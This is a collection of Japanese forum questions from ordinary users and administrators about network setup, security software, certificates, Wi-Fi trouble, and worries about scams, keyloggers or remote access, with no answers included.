違法サイトですか?対処方法も教えていただきたいのですが…。とても不安で困っています。 先日、誤ってhttp://**w.broad-tube.com/index_ent2.php?blog=B-G(ピアノ?[ピアノ運営事務局])というサイトに飛んでしまい、年齢確認が出たので18歳以上をアクセスしてしまったところ、画面が変わり怖くなってすぐに「×(閉じる)」を押したのですが、登録完了画面が出ていたような気がします。 怖くなり、前のページに戻ると、確認画面の下に小さく『登録完了の時点で150,000円が発生します。』と書いてありました。 その下に利用規約があり、そこには『二日以内にご郵送ください。』と書かれてました。 まだ、日にちがたってないので、電話などはありません。 不安でいろいろ対処方法など調べると無視するのがよいとありましたが、このサイトが本当に違法サイトなのかわからずどうすればよいか困っています。 怖くて親にも言いだせません。 恐怖と不安でいっぱいです。 できるだけ早めに回答いただきたいです。お願いします。
最近、ある伝説迄ある、お店に行き、疑問があったので、 回答が凄く勉強や参考になるため、OKｗｅｂと、YAHOO知恵袋に、質問をしました。 2ｃｈでも、そのお店の部屋があり、大勢のファンの人がお店について賞賛の、話をしているので 自分は、良いとは思わなかったと、攻撃や中傷ではなく感想を書きました。 すると、YAHOOで回答があった人の中で 私がブログを持っていること、いつどこでどんな事を書いていて それに対して、返答があった無かったと、私のネットの状況を 書いて来て、そのお店の擁護に書き込みをしてきた人がいます。 ネットはごく普通の知識しかなく、何かについて書いただけで 個人のブログまで探し出したり、何をいつ書いたなど、全部探し出せるはどうなっているのか 正直、驚きました。 自分のブログは個人的に、地味に作っただけなので どうすると、一つのお店の事を書いただけで 全部、いつ、どこで、あなたは何を書き込み、ブログを持っていますよね？ と、一気に調べて来られるのか、自分にはそんな事を出来る事も、方法も想像もつきません。 パソコンを使うだけで、これだけ情報を探し出せるのは 個人の情報は、簡単に漏れてしまえるのでしょうか？
例、教えてgooやgoogleなどいろいろなクラウドのサイトを利用していますが、アドレスやハンドルネームとパスワードを打ち込むだけで、開きますが、こんなに簡単に接続できているのは、セキュリティが甘いのでは?アドレスを利用して知人などが知っていると、あとはパスワードさえあえば開いてしまう訳ですから、怖く感じています。 　 のではないですか?googleのアドレスを利用していると、あとはパスワードさえあえば開いてしまうえあかですから
画面にこのような物が出てきてニコニコ動画が全く見られません!クリックしても何も反応しませんし、試しにadobe flash playerをダウンロードしても変わりませんでした。 問い合わせしてみようかと思いましたが、見たところサイトには総合受付のようなページがありませんでした・・・・何か解決策はないかと悩んでいます・・・・・ ちなみに、Google Chromeではニコニコ動画が見れましたが、普通のインターネットでは見れませんでした。 わかりずらくてすみません・・・・・私はコンピューターは苦手なのでこのような曖昧な質問になってしまいました・・・・・・
友達からパソコンにGメールが届きました。 その受信画面の送信者のところにカーソルをあてると、 吹き出しの様なものが出てきて”別人名”（以前、何度も変なメールを送ってきた人の名前） が表示されました。これってどういうことですか？　とっても怖いです。 その別人名の所をクリックすると、今度は友達の名前が表示されました。。。 友達のプロフィールに他人が入り込んで書き込む事は可能なのでしょうか？ それとも友達が、他人に成り済ましてメールを送ってきたという事なのでしょうか？
WindowsXPモードについて教えてください。 Windows7を使用しています。 以前XPで使用していたアプリケーションを動作させたいと思いXPモードをインストールしました。 このアプリケーションはネットワークアダプタの詳細設定からLink Speed＆Duplexを10Mbps全二重に固定する必要があるのですが Windows7側では設定できても、XPモード側で設定するとエラーになります。 何か良い対処方法はありませんでしょうか？ （Windpws7側もXPモード側も10M全二重に固定したい） よろしくお願いします。
SRX系のFireWallのCLIのことで質問ですが、 set applications <application-name>　で設定したサービスグループの削除の仕方を 知っているいましたが教えてくれませんでしょうか。 マニュアルやググっても見つからなかったので教えてください。
会社使用のパソコンでパソコンの使用されているかどうかを遠隔で知ることできますか？
パソコンを購入してからしばらくたちました。 ネットを閲覧していると 「マカフィーの有効期限が近々切れるので新しく購入してください」 と表示がでます。 そこで質問なのですが、パソコンユーザーはセキュリティソフトの期限がくるたびに購入しているのでしょうか？
セクリティソフトについての質問です。 ahn lab v3とかaviraとかavastとかいろいろありますが セクリティソフトって何がいいんでしょうか？
この前まで繋がっていたのですが、急に繋がらなくなりました。 接続済みとなりますがWi-Fi接続を示す扇形のマークが灰色のままで青色になりません どうすれば接続できるようになりますか？
小規模の会社なのですが、外部のレンタルサーバーで 独自ドメインを設置しメールサーバにもなっています。 現在のメールはここのPCに受信してしまうので、 外出してしまうとすでに受信したメールが見れません。 ですので、Outlook Web Accessの導入を検討しています。 インターネットにつながる環境であれば、いつでも同じメール環境に したいと考えています。 Outlook Web AccessというとExchangeが必須になるのでしょうか？ MicrosoftでもExchangeOnlineというサービスがありますが、 それを利用する為には、メールサーバーをそちらに移動するということに なるのでしょうか？ もしくは既存のレンタルサーバーから転送みたいなことをすれば 良いのでしょうか？ ご存知の方は教えてください。
私は中古機械販売の自営業者です。 最近になって（約２週間前から）急にOCNユーザーのお客からのみメールが着信しなくなりました。 私はMSNの有料メールを使っております。　こちらからのメールはOCNユーザーのお客さんにも 届きます。　こちらから空メールを送って変身してもらっても　だめでした。 どのように対処したらよいのか　教えてください
サイトにhttpで接続する部分と、httpsで接続する部分があります。 それぞれ httpdocs と httpsdocs のディレクトリにコンテンツを分けて入れているのですが、なぜか急にhttpsの方だけ、異常に接続が重くなってしまい、タイムアウトするようになってしまいました。httpへの接続の方は特に問題も無く、サーバに入りtopコマンドで負荷を見ても特に問題は無さそうなのですが...。 どんな原因が考えられますでしょうか？ httpdをリスタートさせても特に変わりません...。 WebサーバはApacheです。 よろしくお願いいたします。
完璧な画像ダウンロード防止方法というのは存在しないのでしょうが、 それでもできる限りの範囲での方法を検討しています。 自分が考えられる限りの事をしたものが以下のサイトです。 http://each.1000sei.com/image_protector/ bitmap画像はIEで保存できてしまうのは確認しました。 IE7以下で表示してPrintScreenする方法も確認しました。 IE9, Firefox17, Chrome23にて以下のツールなどを用いてキャッシュに残らないのを確認しました。 http://blog.verygoodtown.com/tag/chromecacheview/ 何かほかにダウンロードできる方法があれば対策を検討してみたいので教えてください。
YAMAHA RTX1100のルーティング・フィルタ設定についてご教授ください。 YAMAHAのRTX1100を使用して2つのセグメントのネットワークを構成しています。 ネットやマニュアルを参考に設定しているつもりなのですがうまくいかず困り果っております。 非常に初歩的な内容で恐縮ですし、質問の仕方もおかしいのかもしれませんが お知恵を拝借できれば大変ありがたいです。 現在 LAN1側に 192.168.100.1/24 LAN3側に 192.168.200.1/24 とIPを振りLAN2をPPPOE接続として使っております。 そこで LAN3の192.168.200.10にサーバーを置きLAN1にあるクライアントPCからアクセスできるようにして なおかつLAN3の192.168.200.0/24にあるクライアントPCからはLAN1の192.168.100.0/24へは アクセスできないようにルーティングとフィルタの設定を行いたいのですがどのように設定を行えばよろしいでしょうか？
WiiUを購入してさっそく設定をおこないインターネット接続をしてみたのですが、アクセスポイントが見つからないとエラーになって接続できません。どなたかインターネット接続できているかた設定を教えてください。 MotorolaSBG900の無線モデムを利用。３ＤＳは問題なく接続できています。
自己著明入り証明書を使用した場合、アクセスした時に下記のように表示されます。 この Web サイトのセキュリティ証明書には問題があります。 この Web サイトで提示されたセキュリティ証明書は、別の Web サイトのアドレス用に発行されたものです。 セキュリティ証明書の問題によって、詐欺や、お使いのコンピューターからサーバーに送信される情報を盗み取る意図が示唆されている場合があります。 このページを閉じて、この Web サイトの閲覧を続行しないことを推奨します。 ここをクリックしてこの Web ページを閉じる。 このサイトの閲覧を続行する (推奨されません)。 きちんとVeriSignやグローバルサイン等の認証局を利用している場合は、こういうものが出ないという認証ですが(正しいですか？) 自己著明入り証明書を作成して利用した場合、認証局を利用した時のようにこういう表示を、初回から出さずにアクセスすることは可能ですか？ よろしくお願いします
個人用のWebサイトを作成するために独自ドメインを取得し、レンタルサーバーを借りました。 そこで、個人用WebサイトのメールフォームをPHPで作成したので、メールサーバーをレンタルサーバーのものに設定し、テストメールを送ってみたところ、その後から出会い系の迷惑メールが1日20件くらいくるようになりました。 テストメールした送信先メールアドレスは私がプライベートで使っている、グーグルのGmailです。 これは、なぜでしょうか？レンタルサーバーのメールサーバーのセキュリティーが弱いせいで、メールを送信中にハッカーのような業者にメールアドレスが抜き取られてしまったのでしょうか？ ちなみに、迷惑メールを送ってくる相手は、チェリーとなるところで、件名は「吉原　楓」です。 この相手から、多くの迷惑メールがきます。
現在会社の経営状況など人に教えれない情報があり、共有回線を使ってほかの方のPCに直接ファイルを転送しています。その際、ファイルを受信した人、送信した人のところにそのファイルが存在するのはわかるのですが、キャッシュとしてその情報が漏れてしまうことはあるのでしょうか？ わかりにくいかと思いますがよろしくお願いします。
特定IPのサーバーからのみはSMTP-AUTH認証をしない方法はありますでしょうか。 よろしくお願いします。
少々最近気になっていることがあり、質問させて頂きました。 私のパソコンのIPアドレスを知っている他人が、私のパソコンにアクセスして、データ（ファイルの中身など）を見ることやIPアドレスを利用して私が書きこんだページを特定することなどはできるのでしょうか。 また、他人からのアクセスのログ（アクセスしてきたコンピュータ情報、アクセスしたファイルなども含めて）をとることはできるのでしょうか。もしできたら教えて頂けると幸いです。 コントロールパネルでセキュリティ情報を調べると、ネットワークファイアウォールはWindows ファイアウォール、ウイルス対策はビジネスセキュリティクライアントウイルス対策、スパイウェアと不要なソフトウェアの対策はWindows Defenderとビジネスセキュリティクライアント　スパイウェア対策、インターネットセキュリティ設定は全て推奨される設定、となっております。 ネットワークアクセス保護は無効でネットワークアクセス保護エージェントサービスは実行されていませんと記載されています。
Twetterのログインする際に入力するパスワードは、簡単にハッキングしたりできるものなのでしょうか。 よく、アカウントをのっとられた・・・なんていうのも目にします。ハッキング行為自体、犯罪ですよね？そんな簡単に、素人でも出来るものなのでしょうか。
証明書のインポートウィザードで「秘密キーの保護を強力にする」のチェックが外せない 使用環境：Acer デスクトップWin7 pro 32bit IE9 です。 保険代理店をしております。 専用サイトにログイン・使用するのに証明書が必要です。 電子証明書を取得する際に、表示される「証明書のインポートウィザード」で 「秘密キーの保護を強力にする」のチェックを外す必要があるのですが、 利用のPCではその部分がグレーアウトしていてチェックが入ったまま、外れないようになっています。 証明書のインポートはできたのですが、毎回パスワードの入力を求められ、面倒です。 保険会社からは、今後チェックを外してください、といわれております。 残念ながら、保険会社のサポートデスクでは、技術的なサポートはしていないとのこと・・・ IE9の設定をリセットしてみましたが、変化なしです。 どこを設定したらチェックが外れるようになるのか分かる方、ご回答よろしくお願いいたします。
米ニューヨーク・タイムズ紙(9月27日付)によると、オバマ民主党政権は来年の連邦議会に向け"盗聴法改正法案"を準備している。今回の改正では、インターネット向け通信傍受の強化をねらっており、ブラックベリー端末による暗号メールやフェースブックなどのソーシャル・ネットワーク、スカイプのようなP2P電話などが含まれている。 という話ですが、 せっかく盗聴しても、AESで暗号化されていて解読できなければせっかく法律を改正しても意味が無いように思えます。 アメリカ政府は、標準として推奨しているAES暗号を解けるのでしょうか？ それとも、暗号通信を奨励するためにこんな法律を提出しているのでしょうか？
debianを使っております。 /etc/network/interfaces というファイルを編集することで設定を変えることが出来るようなので、 さっそくviエディタで開いてみました。 すると、 「auto lo」 「iface lo inet loopback」 などなどが書いてありましたが、 意味が解りません。 このファイルはどんな文法で書かれているのでしょうか？ 教えてくれるか、または細かく解説されているサイトを教えてください。
仕事の都合上普段から、モバイルパソコンを持ち歩いています。 （※また、そのパソコンを使って業務管理等をしています。） その過程で無線でインターネット通信をすることがあるのですが、最近のニュース等を見ているとパソコンの遠隔操作が怖くなってきました。 そこで教えてください。この場合遠隔操作される可能性があるのでしょうか？ パソコンは詳しい方ですので技術的な内容でも教えていただけると嬉しいです。 わたしの場合、モバイルパソコンで通信する場所は３か所あります。 １、仕事先でよく泊まるホテルの無線LAN ２、仕事途中で休憩する友人が経営する喫茶店の無線LAN ３、知人宅の無線LAN となります。 毎回、この３箇所でしか通信は行いませんし、この場所ではよくインターネット通信をします。 このように私みたいにパソコンを手持ちで動き、パソコンの通信場所が違う環境で、特定のわたしのパソコンのみを遠隔操作することは可能なのでしょうか？ 極めて不可能であれば安心して、インターネットができるのですが。。。 どなたか技術的に話されてもいいので教えていただけたら幸いです。 仕事で大切な情報を扱うので、、。
NTTルーター（PR-400E）を使用している環境で、 無線LANを設置したいと思います。 NTTルーターに差し込めるLANカードがなかったので、 Buffaloの無線LANルーター（WZR-HP-G302H）をNTTルーター（PR-400E）にLANケーブルで接続してアクセスポイントとしてを使用したいと思います。 無線機能はBuffaloルーターで使っていても、 IPアドレスの配布はNTTルーターのDHCPに一本化して無線LAN接続を使いたいのですが、 いざ、やっては見たものの、NTTルーターにISPの接続設定を施し、 無線LANルーターにもISPの接続設定を施してでないと使えない状態です。 つまり、それぞれが独立したルーターという状態でしょうか？ という、目的の叶いそうな設定項目が見つからないと言いますか…。 NTTルーターは電話とFAXの設定も兼ねている為、 Buffaloルーターに一本化出来ませんし困りました。 ご教示よろしくお願いします。
新米のネットワーク担当者です。 ネットワーク設定について教えてください。 あるクライアントから別の建物にあるサーバーに\\10.6.xx.xxxのように接続しようとしているのですが繋がらず下記のようなエラーとなってしまいます。 「ファイルとプリンターの共有リソースはオンラインですが、接続試行に応答していません。」 pingは通るのですが、何がいけないのでしょうか。 ポートも開放しているのですが。 クライアントとサーバーのネットワーク設定はそれぞれ以下のようになっています。 クライアントのネットワーク設定は IPアドレス：10.4.46.xxx サブネットマスク：255.255.255.0 デフォルトゲートウェイ：10.4.46.254 サーバ-のネットワーク設定は IPアドレス：10.6.11.xxx サブネットマスク：255.255.252.0 デフォルトゲートウェイ：10.6.10.254 以上よろしくお願いします。
パソコン初心者です。 今SoftBankのルーターでインターネット接続しているんですが、WiMAXが安いと聞いたので乗り換えたいと思います。 パソコンは2年前に買ったものなんですけど、WiMAXは使えますか？ てかどのパソコンでも無線ラン対応ならWiMAXが使えますか？
webを独学中の初心者です。 よろしくお願いします。 ttp://dotinstall.com/lessons/basic_local_development/2210 →レッスンサイト#10 ターミナルから作業できるようにする ttp://moonblack.net/archives/2571 →windowsで構築する場合 今回、PHPの勉強の為に ローカル開発環境の構築をするという事で 某レッスンサイトの手順通り進めているのですが #10でつまずいております。 #10までは手順通り進んでいるのですが •ターミナルからのアクセス（ssh -l ユーザー名 ホスト名） の、部分で ssh: taguchi.dev: Name or service not known と、エラー(?)が出ます。 初心者過ぎて何を質問すればいいかすら判らない状態で とにかく進めないといった具合です。 質問タイトルも、 これが正しいのかすら微妙なところです（汗） こんな知識状態で恐縮なのですが、 何かご助力頂けましたら幸いです。 PCスペック: win7 64bit メモリ2g AMD Athlon(tm)II X4 645 Processor 3.10GHz 使用ツール:CentOS VirtualBox Cyberduck Hosts File Manager Tera Term
会社より、モバイル端末を持たされています。 そして、我が社ではクラウド型のソフトで 受注情報やスケジュール管理等をログインして入力しています。 私は勤務時間中に入力等をする時間がない時や打ち込むデータが 多いものに関しては、帰宅後に私しか使わないPCでログインして 入力しています。 しかし、今回どうやら会社側が、個人情報保護の観点から、 配布しているモバイル端末でしかクラウド型ソフトに ログインしてはならないという決まりを 作ろうとしているようです。 そもそもクラウド型ソフトにセキュリティー対策していない モバイル端末でアクセスしている事自体が一番危ないと思うのですが… 会社側の人間が気分屋で、思った事を押し付けるので困っています。 が、私もこうしたソフトやセキュリティー、個人情報保護、法律等に 詳しくなく、合理性がないと思われる今回の処置にも首を傾げながらも 反論できる材料を持ちません。 会社側の言っている事が、正しいなら従いますが、 突っ込みどころ満載な気がするのです。 どなたか指摘していただけますでしょうか。
表示が遅いページがあったのでルーター（RT58i)のMTUを下記の実験から １４２０＋（IPヘッダ20bytes）＋（ICMPのヘッダ8bytes）＝１４４８に決定しました。 C:\Users\honjoy>ping -f -l 1420 -n 1 xxx.xx8.95.24 xxx.xx8.95.24 に ping を送信しています 1420 バイトのデータ: xxx.xx8.95.24 からの応答: バイト数 =1420 時間 =8ms TTL=54 xxx.xx8.95.24 の ping 統計: パケット数: 送信 = 1、受信 = 1、損失 = 0 (0% の損失)、 ラウンド トリップの概算時間 (ミリ秒): 最小 = 8ms、最大 = 8ms、平均 = 8ms 参考ページ http://www.atmarkit.co.jp/fwin2k/win2ktips/652pi … そこそこ快適になったのですが、疑問が生じました。 今回ルーターに設定したのですが、WINDOWSマシン（今回VISTA）のMTUと ルーターのMTUの関係が分かりません。 乱暴ないいかただと、大きなIPパケットをルータで１４４８に分割しているはずなのに、 ｗｉｎｄｏｗｓはデフォルトの１５００？のままでいいのかなってところです。 いままで、上手く動く適当な値を突っ込んでいましたが、今回理由あって、疑問が出てきました。 どなたか詳しい方お願いします。 また認識が間違っていたらおしえてください。
次世代(L7)ファイアウォールについての質問です。 社内で、次世代ファイアーウォールを導入する事になりました。 しかし、ネットで調べてみたものの、 ほとんど次世代ファイアーウォールについての知識が無い状態です。 当社の環境は ・インターネットが利用出来るパソコン約200台程のネットワーク ・ルータから直接、各クライアントに繋がっている ・外部公開用の自社サーバは無し ・ワークグループ環境(今後ActiveDirectoryを導入予定) となっております。 この環境で、次世代ファイアウォールを導入した際のメリット・デメリット、 おすすめのメーカー、運用コストについて、知恵をお貸し頂けないでしょうか？ よろしくお願いします。
今回、自社のWebサーバ（IIS7.0）のセキュリティ強度を 高める為、SSLによる暗号化通信の実装を検討しています。 その際に、第三者機関の発行による「証明書」をサーバ側に インストールさえすれば、暗号化通信は実現できるのでしょうか？。 ブラウザはIE8を想定していますが、ブラウザ側には別途証明書の インストールや、設定変更は必要でしょうか？。 ※「クライアント証明書」というキーワードも見つけたのですが、これは不要でしょうか？ アドバイスを頂けると助かります。
近所の無線LANを勝手に使ってしまいました パスワードをかけてはいなかったのでPSPがインターネットに繋がってしまって モンハンのクエストをダンロードしてしまいました・・・ 後からいろんなところをみると犯罪と書いてあって捕まってしまうのですか・・・ 親にも言えないしどうすればいいのかわかりません
この質問（http://oshiete.goo.ne.jp/qa/7227744.html）を見て思ったのですが、対策方法は無いのでしょうか？ ウィルスバスターにはいってますが、それだけじゃダメなんでしょうか？ よろしくお願いします
一年程前に スパイソフト対策の為にとTrend Micro GuardedIDと言うソフトを銀行振り込みで購入してPCに取り込みました。取り込んだPCがおかしくなりPCを買い換えるハメになりました。上記のソフト購入後約一年経ち数日前にソフトを更新してくれとメールがきました。内容は ここからです⇒Trend Micro GuardedID Premium (へのアップグレード)」のサブスクリプションの次回お支払い日は2012/12/14です。 お支払い方法として銀行振込が選択されています。代金JPY 680をお振込みいただきますよう、お願い申し上げます。 入金の確認後、"Trend Micro GuardedID Premium (へのアップグレード)" の発送が行われます（Eメール）。 必要なお支払い情報を、次のとおりご案内いたします。支払い処理は弊社認定パートナーであるNetgiro Payments ABが代行いたしますので、あらかじめご了承ください。 この請求書は、サブスクリプションの開始日が2011/12/14の上記サブスクリプション（注文番号: 399961255）に関するものです。 次回のお支払い期日は、2012/12/14です。 ************************************************************************* サブスクリプション 以下の製品ではサブスクリプションが必要です。 Trend Micro GuardedID Premium (へのアップグレード) サブスクリプションの有効期間： 期限なし 請求サイクル： 次の期間ごと:12カ月 振込先 注意事項：お支払いの際には、必ず記載した振込情報を使用してください。記載した振込情報を使用して、お支払いが正しく割り当てられるようにしてください。 決済受付番号： ＊＊＊＊＊ 受取人： Bibit Payments K.K. 銀行名： Sumitomo Mitsui Banking Corporation 銀行コード： 0009 支店名： Tokyo Daiichi Branch 支店コード： 931 口座番号： 0009788903 （普通口座） 金額： ¥ 680 element 5 - a service of digital river - www.element5.com Digital River GmbH Vogelsanger Str. 78, D-50823 Cologne 最高経営責任者：John Strosahl、Carsten Grüttner 会社所在地：Cologne / HRB 56188 / ケルン管轄区裁判所 以上のような内容です。私自身更新ソフトを注文した覚えも更新する気もありません。 金額こそ小額ですがこれは支払いの必要ありますか？裁判所の文字が気になり質問させていただきました。 無視して支払いしなくて問題ないのでしょうか。お答えよろしくおねがいします。
ネットワーク設計に興味を持っているプログラマです ネットワーク設計書って具体的にどんな種類の設計書があるのですか ネットワーク設計書の種類を列挙してください。 また、その設計書の内容を大雑把でかまわないので教えてください。
私は小さな会社のプログラマなのですネットワークエンジニア と呼ばれる人が会社にはいません また入社したばかりで先輩がネットワークについて何をしているかも わかりません。 設計、構築、運用等があると思うのですが 具体的にどんな仕事なのか教えてください。
FMV-BIBLO NF40UなんですがリカバリーしたらFUJITSUのロゴ画面で左下にEnterかマウスをクリックしてくださいになってクリックしたらBIOSセットアップとかが出てそれを標準設定にして起動したら毎回黒バックで、そのまま進めても一緒なんですけど Marvell(R) Base Code v1.0.1.3 (20050811) (C)Copyrig 2005 Marvell(R). All rights reserved. .............こんな感じで後9行ぐらいつっくんですがこれなんすか？ ちなみになんとかDiskっつうのもないのでその状態で起動させたいんですがどうすれば良いですか？
同一拠点に二つのLANがございます。 それぞれで運用されていたLANですが、 このＡ,Ｂ二つのLANに接続するＣというPCを追加したいと言う事です。 ・LAN内のネットワーク設定を変更する権限はありません。 ・両LANともネットワーク構成図はありませんが、接続しているPC一台一台調査することは可能です。 ・ＣのPCの権限はあります。 ・ＡのLAN内のＤのPCと、ＣのPCがファイル共有を行いたいのです。 ・ＢのLANではインターネットに出て行くことが目的です。 ・両LANともネットワークアドレスは192.168.1.0/24です。 ・ＣのPCはWindows7Proです。 要約すると、主としてＢのLANでインターネット接続して、ＡのLANでＤのPCとファイル共有をしたいのです。 ネットワークアドレスが違えば、LANアダプタの二枚刺しだけで解決すると思ったのですが、 両LANとも同じネットワークアドレスなので困っています。 ＡのLANにはＤのPCしか目的はないので、Ｄが固定IPであれば何とかなるのではないかと思っております。（それからの設定はわかりませんが） 何か解決策はございませんか？ 宜しくお願いします。
デジタル署名の仕組みについて教えてください。 デジタル署名の仕組みは、メールの内容（原文）からメッセージダイジェストを作成し、それを送信者の秘密鍵で暗号化したものを署名として原文（または暗号文）に付けるということですが、どうして単に原文そのものを暗号化したものを署名として送らないのでしょうか？ 改ざん防止の為であれば、原文そのものを暗号化して送れば、受信側で改めてメッセージダイジェストを作成し、それと復号化したメッセージダイジェストを突き合わせて検証するようなことをしなくても済むと思うのですが。 いづれにしても公開鍵で復号化できるということは、秘密鍵を持っている送信者が署名した段階から改ざんされていないはずですし、その公開鍵が証明書等により検証できていれば、確かに本人であるということになりますよね。 現実世界の「署名」のように、署名とは原文とは別につけるもの（＝わざわざ復号化しなくても原文が読める）、いうことに似せているだけのことでしょうか？ （参考URL） http://www.ipa.go.jp/security/awareness/administ …
先日、ウェブ上でトロイの木馬を検出しました。（avast5使用） ステータス欄にはJS:ScriptSH-inf[Trj]と書かれています。 先日、ウェブ上でトロイの木馬を検出しました。（avast5使用） ステータス欄にはJS:ScriptSH-inf[Trj]と書かれています。 詳細を開くと、「危ないところでしたがご安心ください。アバスト! がクラッシュから保護しました」と書かれていたので 特に何も行っていないのですが、頻繁に検出されるようになったので 一度完全検査を行ったところ、ウイルスは発見されませんでした。（WindowsDefenderでも検出されず） しかし、今でもIEを開くたび（またしばらく繋いでいた時）に avastから検出の報告が届きます。 また、詳細を開くとなお「危ないところでしたがご安心ください。アバスト! がクラッシュから保護しました」と出ます。 対策はどうすればよいのでしょうか。本当に大丈夫なのですか？
先日新しいPCを買い、有線で接続しています。 ブラウザはgoogle chromeを使用しています。 すこし前までは問題なくブラウザを閲覧できていたのですが、 ある日PCを立ち上げると突然、インターネットには接続できているのですが 接続エラーでブラウザに繋がらなくなりました。 それ以降、毎回PCを立ち上げるたびにブラウザが閲覧できなくなり、 数分すると閲覧できるようになります。 そしてまた数分すると閲覧できなくなり、数分するとまた閲覧出来るようになったりと、 この繰り返しです。 配線はモデムから各他のPCやPS3等に接続しているのですが、 このPCを立ち上げたときのみ、上記のエラーが起こります。 また、このエラー状態の時には、他のPC等でも同様のエラーが起こってしまいます。 おそらく、このPCが悪いのだとは思うのですが検索しても ハッキリとした解決方法が見つかりません。 もしかするとウィルス等の影響なのでしょうか・・・？ どなたか回答をお願いします。
すみません、1つ質問させてください。 win2003で試験的に内部DNSを構築したのですが、 最近以下のイベントが記録されます。 ID:5504 ソース：DNS DNS サーバーは、122.129.***.*** からのパケットに無効なドメイン名を検出しました。 パケットは拒否されます。 イベント データに DNS パケットが含まれています。 恐らくIP：122.129.***.***から当方のDNSに対して、外からアクセスがあったのだと思いますが、 DNSは内向きで、NAT配下に入っています。 またどのポートもこのDNSにはフォワードしていません。 (IPフィルターは特に掛けていません) それなのに何故外部からアクセスがあるのでしょうか？ よろしくお願いいたします。
初歩的な質問ですみません。 ciscoのルーターに、以下のstaticルートを設定しようとすると、 エラーが出て設定できません。 なぜでしょう？？ ip route 10.156.1.191 255.255.255.0 10.121.47.254
PCでスカイプを利用したいです。インストールし登録できたのですが、エラーになります。調べてみたらファイアウォールの事がかいてあったので、スカイプを利用可能に変更しました。（でもPC初心者のため、できているか不安です＾＾；ファイアウォール設定で利用可能のところにチェックつけました・・・） でもスカイプはまだ使えません。ほかにも原因はあるのでしょうか？ Windows７　です。ウイルスバスターが入ってます。 本当に超初心者なので、申し訳ないのですが詳しく教えていただけるとありがたいです。 困っています。よろしくお願いします。
まったくパソコンに詳しくない者なのですが、 このたび仲間内でネットのクイズゲームをやろうということになりまして、 下記サイトの「P　C　O　Q　3」というソフトをダウンロードしたところ、 （ttp://www42.tok2.com/home/kazamori/） サーバーを立ち上げてポート開放しなくてはならないとのことです。 ----------------------【マニュアル抜粋】 このソフトは通信にポート52294番を使用しています サーバを立てる方は52294番のポートを開放した上で起動してください。 ----------------------- ネット検索で「ポート開放」という下記サイトを見つけて 実際にやってみようと思っているのですが。 （ttp://www.geocities.jp/seidy_seidy/bb/port.html） そもそも自分のパソコンでポート開放ができるのか、 できたとしてもスペック的にどうなのか（サーバーになって動作が重くならないか）、 という不安があります。 特にPoketWiFiを使用しており、速度的に不安がありまして。 仲間に頼むことも考えたのですが、みんなよく分からないそうで……。 ひょっとすると間の抜けた質問になっているのかもしれませんが、 それなりに真剣です。 何かしらアドバイス頂けますでしょうか。 １から出なくも構いません、参考になるサイトでも示して頂ければ嬉しいです。 よろしくお願いいたします。 下記がスペック--------------------- ＯＳ：Vista プロセッサ：Mobile AMD Sempron(tm) Processor 3200+,~1.6GHz メモリ：894MB RAM デバイス　ATI Radeon Xpress 1100 メモリ合計：319MB
今何故かPCがネットに繋がりません。 繋げようとするとネットワーク セキュリティ キーを入力してください、と出てきます。 前まで普通に繋げてたのでセキュリティキーが何なのか全く分かりません。 バッファローを調べてみたり、セキュリティキーについて検索したりしましたが やはり分かりませんでした。 セキュリティキーはどこに表示されているのでしょうか。
お世話になります。 社内ネットワークからのプロキシサーバ経由で、インターネット（社外）接続を しています。 特定のサイトにアクセスをすると、下記のエラー情報が 表示されてしまいます。 （例）URL http://＜ipアドレス＞：8080／ｘｘｘｘｘｘｘｘｘｘｘｘｘｘｘｘｘｘ ※エラー内容 --------------　ここから　-------------- エラー 接続拒否されました ------------------------------------- 上位サーバ側から接続拒否されました。 しばらくしてから再度お試しください。 --------------　ここまで　-------------- その特定のサイトにアクセスする理由として、ある情報を自動的（ブラウザ画面）に取得 する為にアクセスしているのですが、取得できない為 調べたいと思ってます。 社内のシステム管理者に聞いても特に制限はかけてないという回答をもらっていて 相手先にもプロキシサーバ経由で接続しても大丈夫なはずですっとは聞いてます。 これが、社内上のプロキシサーバ・FW で制限がかかっているのか 相手先のサイトにアクセスした際に、プロキシからのアクセスが制限がされてしまったのか 特定したいのですが、確認する方法を教えていただけますでしょうか ご面倒かけますが、よろしくお願いします。
デジタルライフのカテゴリでも質問したのですが、重要な事柄のため、念を入れて、【技術者向け】コンピューターのカテゴリでも質問させていただきます。 監視ソフトなのかキーロガーなのか分かりませんが、ある方（特定できています）に仕込まれたらしく、個人情報がつつぬけていました。 現在は、再インストールして、相手には分からなくなってしまったのが確認できています。 ここで質問です。 ＣＤ－Ｒにバックアップをしたのですが、これらを再インストール後のパソコンに入れた場合、危険でしょうか？ その相手からのファイルやフォルダ、ＰＤＦなどはＣＤ－Ｒには保存していません。 それ以外の全く関係のない自分で作ったテキストメモや画像、その相手とは全く関係のないＰＤＦファイルなどのバックアップデータも危険でしょうか？ ＣＤ－Ｒをパソコンにうつした場合、ＤＶＤ－ＲＡＭ ドライブ（Ｅ）に表示されます。 この中で必要なものだけ開き、パソコンにうつさず、使う時だけＣＤ－Ｒをパソコンにいれて使うという方法だとどうなんでしょうか？ また、ＰＤＦや画像、動画などに危険性はあっても、テキストメモならば感染の可能性はないでしょうか？ ＣＤ－Ｒをパソコンにいれて、ＤＶＤ－ＲＡＭ ドライブ（Ｅ）に表示されているけど、ファイルなどを開かない状態の場合でも、危険性はありますか？ ちなみに、ウイルスバスターでは、再インストール前でも何も検出されない状態でした。 なので、ウイルスなのかどうかも不明で、単なるキーロガーや監視できるソフトなのかもしれません。 質問が多くてすみません。 一番聞きたいのは、感染元以外から入手したファイルや画像なども駄目になってしまっている可能性はあるのか？ということです。 よろしくお願いします。
会社でシステム・ネットワークを担当しています。情報セキュリティの観点でWindowsXP、７のPCで ファイル共有をできないようにすること、もしくは作っても共有できない、または、ファイル共有を 検索する方法はないでしょうか？PCでファイル共有をする場合、ほとんどがアクセス制限の設定が なく、ゲストアクセスになっている状況です。社内には、ファイルサーバも設置してあるので、そちらを 使ってもらいたいところです。 端末は700台くらい、ユーザもコンピュータもAD配下となっています。 よろしくお願いいたします。
１ヶ月前まではYouTubeなど動画がすべてスムーズかつ早く見れたんですが、最近は再生されなかったり途中で止まったりします。スマホの種類はxperiaSO-4Dです。だれか解決法教えてください。とても困ってます。お願いします。
